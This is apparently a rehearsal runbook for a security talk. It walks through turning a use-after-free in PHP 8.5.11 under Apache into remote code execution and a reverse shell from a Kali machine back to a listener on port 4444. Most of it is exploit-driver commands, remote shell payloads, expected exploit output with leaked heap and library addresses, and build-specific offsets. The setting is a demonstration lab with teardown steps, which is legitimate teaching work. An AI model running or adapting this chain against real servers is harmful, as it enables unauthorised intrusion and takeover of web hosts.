# Runbook — 192.0.2.20 (target) + 192.0.2.10 (Kali)

Step by step **from `git clone`** to the reverse shell, on both machines of the
lab. This is the rehearsal runbook; the IPs use the reserved documentation range
(`192.0.2.0/24`) — replace them with your own lab addresses.

For the stage script (what to say on each slide) use `docs/TALK-DEMO.md`.
This document answers "what do I type, on which machine, and what must I see on
screen".

---

## 0. Topology

| Role | IP | Access | Repo path |
|------|----|--------|-----------|
| Target (Ubuntu Server 24.04, Docker) | `192.0.2.20` | `root` | `/opt/PHP2Shell` |
| Attacker (Kali, hostname `kali`) | `192.0.2.10` | `r19` | `~/PHP2Shell` |

Published target: `http://192.0.2.20:8080` — image `php:8.5.11-apache`,
Apache prefork with **one** worker, `memory_limit=8M`, `display_errors=On`.

The reverse shell leaves the container and returns to `192.0.2.10:4444`.

> The Kali IP is **written inside the stager** (`app/stage/s`) by `install.sh`.
> If Kali changes IP, the target needs `install.sh` again.

---

## 1. Target — 192.0.2.20 (Ubuntu)

### 1.1 Clone

```bash
sudo apt update && sudo apt install -y git
sudo git clone https://github.com/nullbyter19/php2shell.git /opt/PHP2Shell
cd /opt/PHP2Shell
```

If the directory already exists, update it instead of cloning:

```bash
cd /opt/PHP2Shell && sudo git pull --ff-only
```

### 1.2 Install the lab

One command. It installs Docker + Compose (if missing), pulls
`php:8.5.11-apache`, writes the stager with the Kali IP, brings the container
up, opens the port in `ufw` and runs `verify.sh`:

```bash
cd /opt/PHP2Shell/ubuntu-lab
sudo ./install.sh --lhost 192.0.2.10 --lport 4444 --port 8080
```

Expected output (summary):

```
[*] host: Ubuntu 24.04.x LTS
    ok  architecture: x86_64
    ok  image php:8.5.11-apache already present   (or: pulling ...)
    ok  stager: app/stage/s -> 192.0.2.10:4444
    ok  published port: 8080/tcp
    ok  Apache responding
    ok  ufw: 8080/tcp allowed                     (only if ufw is active)
Lab is up.
  Target (Ubuntu)  http://192.0.2.20:8080/
```

### 1.3 Verify (on the target itself)

```bash
curl -s http://127.0.0.1:8080/ping.php
curl -s http://127.0.0.1:8080/ping.php     # the pid= must be the SAME
head -20 app/stage/s | grep -E 'LHOST|LPORT'
```

Expected: `version=8.5.11`, `sapi=apache2handler`, `arch=amd64`, and
`LHOST="192.0.2.10"` / `LPORT="4444"` in the stager.

**If the `pid` changes between the two calls, stop**: the demo will not land
(`docs/TROUBLESHOOTING.md` §3).

> `install.sh` is idempotent. Running it again rewrites the stager and recreates
> the container — it is also the command that fixes `BLIND STEP` on the Kali
> side (old stager, without an HTTP proof).

---

## 2. Kali — 192.0.2.10 (attacker)

### 2.1 Clone and prepare the toolkit

```bash
mkdir -p ~/PHP2Shell
git clone https://github.com/nullbyter19/php2shell.git \
  ~/PHP2Shell
cd ~/PHP2Shell/ubuntu-lab
./kali/setup-kali.sh
```

`setup-kali.sh` clones the public toolkit (`devploit/php2shell`, which carries
the upstream `9bie/php2shell-bypass-aslr-exp` at the pinned commit) into
`~/tools/php2shell` and installs `ncat`/`rlwrap`. It installs nothing on the
target.

Check what is going to be used:

```bash
python3 ~/tools/php2shell/tools/php2shell_auto.py --help | head -5
ls ~/tools/php2shell/profiles/8.5.11-bookworm-amd64.json
hostname -I | awk '{print $1}'      # must be 192.0.2.10
```

### 2.2 Five-second diagnostic

Before any demo, one command tells you whether the target is in the state the
shell step expects (it exploits nothing, it only reads what `install.sh`
published):

```bash
./kali/p2s-diag3.py --target http://192.0.2.20:8080
```

Stage-ready state:

```
    1. GET /            200
    2. /ping.php        php=8.5.11 sapi=apache2handler arch=amd64 pid=160 (same worker)
    3. /stage/s         2060 bytes -> 192.0.2.10:4444 instrumented=yes
    4. /p2s-stage.log   404 - the stager never ran (or is not instrumented)
    5. TCP 192.0.2.10:4444   accepts connection
[+] ready: ./kali/p2s-run.sh --step shell
```

What to fix when it does not look like this:

| Line | Bad state | Fix |
|------|-----------|-----|
| 1 | `000` | container stopped or `ufw` closed → §4 |
| 2 | `worker changed` | `docker compose restart` on the target |
| 3 | `404` | `install.sh` did not run on the target |
| 3 | `instrumented=NO (old install.sh)` | old stager → run `install.sh` again |
| 5 | `REFUSED/not listening` | open the listener (§2.3) |

### 2.3 Listener (pane 1, leave it open)

```bash
./kali/p2s-listen.sh --lport 4444
```

Expected: `[*] listening on 0.0.0.0:4444`. **The listener comes up before the
trigger** — the stager connects once and gives up if nobody is listening.

---

## 3. Attack

Two commands, two results. Both run on Kali, in the `ubuntu-lab/` directory.

### 3.1 Step 1 — proof of execution (5 bytes)

```bash
./kali/p2s-run.sh --target http://192.0.2.20:8080 --step proof
```

What happens: the pre-flight check verifies the home page, `/stage/s`,
`ping.php` (twice, to prove the same worker) and the profile; then the toolkit
chain runs with the remote command `id>p1`. The `p1` file is fetched over HTTP.

Expected output (the core of it):

```
[*] preflight on http://192.0.2.20:8080
    ok  home page responding
    ok  /stage/s present (payload in place)
    ok  stager is instrumented (writes /p2s-stage.log — verdict available)
    ok  target: php=8.5.11 sapi=apache2handler arch=amd64 pid=160
    ok  two requests served by the SAME process (pid=160) — lab condition satisfied
[*] STEP 1/2 · proof of execution (id>p1) · command 'id>p1' (5 bytes; carrier limit: 14)
   │ [+] chunk base = 0x76fffb600000
   │ [+] libphp base = 0x76fff7e00000
   │ [*] stage 3: HTDATA=0x76fffb6690d8 ZIF=0x76fff83996e0
   │ PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`PROOF: uid=33(www-data)` = confirmed RCE. It is not a shell yet.

### 3.2 Step 2 — reverse shell (10 bytes)

With the listener from §2.3 open:

```bash
./kali/p2s-run.sh --target http://192.0.2.20:8080 --step shell
```

The remote command is `sh stage/s`. PHP's `system()` **returns no body**, so the
toolkit has no way to prove execution — it ends with
`EXPLOIT_FAILED (no proof...)` even when the shell opened. That is why the
driver does not use that verdict: it reads the stager log at `/p2s-stage.log`
and decides on its own.

Expected output:

```
╭─ RESULT: SHELL OK ────────────────────────────────────────
│ the stager ran and the listener accepted the TCP connection
│ stager: 2026-11-19T13:23:42Z pid=298 uid=33 cwd=/var/www/html lhost=192.0.2.10 lport=4444
│ stager: 2026-11-19T13:23:42Z connect-ok uid=33
╰──────────────────────────────────────────────
```

And in **pane 1** (listener) the shell prompt appears.

#### The shell step verdicts

| Verdict | Meaning | Exit |
|---------|---------|------|
| `SHELL OK` (green) | stager ran and the listener accepted the TCP connection | 0 |
| `CALLBACK REFUSED` (amber) | RCE confirmed; the listener was not up | 5 |
| `RCE OK · CALLBACK NOT CONFIRMED` (amber) | new log, no connect line | 0 |
| `BLIND STEP (old stager)` (amber) | stager without instrumentation: HTTP neither confirms nor denies | 0 |
| `UNDEFINED (Apache not answering)` (amber) | the chain killed the worker before the log | 0 |
| `NOT EXECUTED` (red) | stager instrumented and no new line | 4 |

Rule: **red only when there is proof that nothing ran**. `BLIND STEP` is the
state of a target that still has the stager from the old `install.sh` — run the
installer again (it is the only way for the verdict to become automatic).

### 3.3 Inside the shell (pane 1)

```bash
id                      # uid=33(www-data) — this is Apache, not root
hostname
php -v | head -1        # PHP 8.5.11, the vulnerable version
ls /var/www/html
cat /var/www/html/stage/s    # the stager that just ran
cat /var/www/html/p2s-stage.log
exit
```

If the prompt does not appear, see §4 before repeating the step.

---

## 4. Between runs and when something fails

The chain dirties the heap and may kill the Apache child. **One attempt per
restart** is the rule of thumb.

```bash
ssh root@192.0.2.20 'cd /opt/PHP2Shell/ubuntu-lab/docker && docker compose restart'
```

If you changed `docker/php.ini`, recreate instead (a single-file bind mount
keeps the old inode):

```bash
ssh root@192.0.2.20 'cd /opt/PHP2Shell/ubuntu-lab/docker && docker compose down && docker compose up -d'
```

Quick diagnostic, in order:

```bash
./kali/p2s-diag3.py --target http://192.0.2.20:8080
curl -s http://192.0.2.20:8080/p2s-stage.log | tail -3
```

If `stage 3 attempt N no proof yet` appears on **every** attempt, the heap is
dirty (restart) or the geometry changed (`--calibrate`, see
`TROUBLESHOOTING.md` §4b):

```bash
./kali/p2s-run.sh --target http://192.0.2.20:8080 --step proof --calibrate
```

---

## 5. Teardown

On the target, after the talk:

```bash
cd /opt/PHP2Shell/ubuntu-lab && sudo ./uninstall.sh --purge
```

`--purge` tears down the container and deletes stager + storage. Do this
**before** taking the VM to any network other than the event one: the stager is
a working reverse shell waiting for an IP.

On Kali, the listener exits with `Ctrl-C`; the toolkit in `~/tools/php2shell`
can stay (nobody executes it).

---

## 6. Compatibility with the presentation

The deck (18 slides) shows `python3 php2shell.py arm|probe|run ...` on slides
1, 7, 9, 12, 14 and 16, pointing at the local Docker (`127.0.0.1:8511`
vulnerable, `8512` fixed, `8513` ASan). That harness **does not implement the
RCE stage** in this repository: `stage_run()` in `exploit/p2s/stages.py`
returns `"grooming and control-flow hijack not implemented yet"`. The chain is
actually executed by the public toolkit (`devploit/php2shell`), invoked by
`p2s-run.sh`.

Slide → this runbook's command map:

| Slide | The deck shows | On this network, run | What appears |
|-------|----------------|----------------------|--------------|
| 1 — cover | `php2shell.py run --cmd 'id'` as the showcase command | nothing to run (illustrative) | — |
| 6 | the Photo Drop application | browser at `http://192.0.2.20:8080/` | upload/gallery working |
| 7 — DEMO 1 | `php2shell.py arm --strategy session` | `--step proof` (§3.1) | `PROOF: uid=33(www-data)` |
| 9 — DEMO 2 | `probe --url 127.0.0.1:8513` + ASan | only on the local `lab/`: `docker compose --profile asan up -d` | `AddressSanitizer: heap-use-after-free` |
| 10 | the seven stages | nothing (map slide) | — |
| 12 — DEMO 3 | `php2shell.py run --cmd 'id > proof.txt'` | `--step shell` (§3.2) | `RESULT: SHELL OK` + prompt |
| 14 — DEMO 4 | `php2shell.py arm --url 127.0.0.1:8512` | local: `lab/docker-compose.yml`; remote: `docker run ... php:8.5.12-apache -p 8081` (`TALK-DEMO.md` §5) | toolkit refuses / no proof |
| 16 | tree with `exploit/ → php2shell.py` | the real tree: `ubuntu-lab/` + `kali/p2s-run.sh` | — |

Two honest ways out for the deck:

1. **Change the command on the demo slides** (recommended): 7 and 12 then show
   `./kali/p2s-run.sh --step proof|shell`, which is what exists and runs; 9 and
   14 remain valid only against the local `lab/`.
2. **Keep the slide and say it out loud**: "the deck's wrapper is the research
   harness; the chain that runs is the public toolkit's, and that is what I am
   executing". It works, but someone will try the slide's command afterwards.

What this lab covers and what it does not (same as `TALK-DEMO.md` §10):

* covers: real RCE (slide 7) and a reverse shell (slide 12) against a target on
  another machine, which is what the audience wants to see;
* does not cover: demos 1/2/4 of the local Docker (8511/8512/8513), which stay
  in this repository's `lab/` — including the comparison with 8.5.12.

---

## 7. Numbers to know by heart

| Item | Value |
|------|-------|
| Target | `http://192.0.2.20:8080` |
| Listener | `192.0.2.10:4444` |
| Remote command (proof) | `id>p1` — 5 bytes |
| Remote command (shell) | `sh stage/s` — 10 bytes |
| Carrier limit | 14 bytes |
| Toolkit profile | `php-8.5.11-bookworm-amd64` (fix in `8.5.12`) |
| Offsets | `HTDATA=0x690d8`, `zif_system=0x5996e0` (Bookworm amd64 build) |
| Proof over HTTP | `/p1` (step 1) and `/p2s-stage.log` (step 2) |
